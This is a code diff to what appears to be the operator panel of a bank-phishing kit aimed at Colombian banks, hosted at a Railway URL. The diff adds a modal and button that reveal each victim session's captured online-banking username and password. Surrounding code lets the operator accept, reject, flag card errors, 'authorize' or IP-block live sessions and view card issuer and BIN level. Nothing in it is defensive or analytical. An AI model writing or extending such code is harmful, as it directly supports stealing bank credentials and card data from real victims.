@@ -408,6 +408,24 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
 
 <div id="toast"></div>
 
+<!-- MODAL PARA VER CREDENCIALES DE AUTORIZACIÓN -->
+<div id="modalVerAuth" class="hidden" style="position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 99999; display: flex; align-items: center; justify-content: center; padding: 20px;">
+    <div style="background: #151b2e; border: 1px solid #252d44; border-radius: 12px; width: 100%; max-width: 400px; padding: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.5);">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; border-bottom: 1px solid #252d44; padding-bottom: 10px;">
+            <h3 style="color: #88f456; margin: 0; font-size: 16px;">🔐 Autorización Banca Virtual</h3>
+            <button onclick="document.getElementById('modalVerAuth').classList.add('hidden')" style="background: none; border: none; color: #ef4444; font-size: 20px; cursor: pointer;">×</button>
+        </div>
+        <div style="margin-bottom: 10px;">
+            <span style="color: #8b94a8; font-size: 12px;">Usuario:</span>
+            <div id="verAuthUsuario" style="color: #fff; font-family: monospace; font-size: 15px; background: #0f1421; padding: 8px; border-radius: 6px; margin-top: 4px; user-select: text;"></div>
+        </div>
+        <div style="margin-bottom: 10px;">
+            <span style="color: #8b94a8; font-size: 12px;">Contraseña:</span>
+            <div id="verAuthPassword" style="color: #fff; font-family: monospace; font-size: 15px; background: #0f1421; padding: 8px; border-radius: 6px; margin-top: 4px; user-select: text;"></div>
+        </div>
+    </div>
+</div>
+
 <script>
 const API_BASE = 'https://multi-bancos-production.up.railway.app';
 let TOKEN = sessionStorage.getItem('adminToken') || '';
@@ -663,7 +681,6 @@ function renderActivos() {
 
 /* ============================================================
    🔥 BOTONES DE SESIÓN
-   Para cc-bogota / cc-bucaramanga: Aceptar, Rechazar, Error CC, Autorizar, IP
    ============================================================ */
 function botonesSesion(s) {
     const bancoKey = s.datos.bancoKey || '';
@@ -673,15 +690,10 @@ function botonesSesion(s) {
     const btns = [];
 
     if (bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga') {
-        // 1. Aceptar
         btns.push(`<button class="btn btn-accept" title="Aceptar" onclick="accion('${sid}','ACEPTAR')">✅</button>`);
-        // 2. Rechazar
         btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
-        // 3. Error CC
         btns.push(`<button class="btn" style="background:#f59e0b; color:white;" title="Error CC" onclick="accion('${sid}','CC_ERROR')">⚠️</button>`);
-        // 4. Autorizar
         btns.push(`<button class="btn" style="background:#3b82f6; color:white;" title="Autorizar" onclick="accion('${sid}','AUTORIZAR')">🔐</button>`);
-        // 5. IP
         btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
         return btns.join('');
     }
@@ -817,7 +829,12 @@ function renderSesiones() {
                 <td class="ip">${escapeHtml(ip)}</td>
                 <td><span class="banco-emisor" title="${escapeHtml(bancoEmisor)}">${escapeHtml(bancoEmisor)}</span></td>
                 <td>${esTarjeta ? renderNivelTarjeta(tipo, nivel) : '<span class="bin-nivel desconocido">—</span>'}</td>
-                <td><div class="actions">${botonesSesion(s)}</div></td>
+                <td>
+                    <div class="actions">
+                        ${datos.authUsuario ? `<button class="btn" style="background:#3b82f6; color:white;" title="Ver Credenciales Autorizadas" onclick="verCredencialesAuth('${escapeHtml(datos.authUsuario)}', '${escapeHtml(datos.authPassword)}')">🔐</button>` : ''}
+                        ${botonesSesion(s)}
+                    </div>
+                </td>
             </tr>
         `;
     }).join('');
@@ -830,6 +847,12 @@ function renderSesiones() {
         });
     });
     actualizarBtnBorrarSesiones();
+}
+
+function verCredencialesAuth(usuario, password) {
+    document.getElementById('verAuthUsuario').textContent = usuario;
+    document.getElementById('verAuthPassword').textContent = password;
+    document.getElementById('modalVerAuth').classList.remove('hidden');
 }
 
 function actualizarBtnBorrarSesiones() {
@@ -1170,7 +1193,6 @@ document.addEventListener('keydown', e => {
     if (e.key === 'Escape' && TOKEN) logout();
 });
 </script>
-
 
 </body>
 </html>
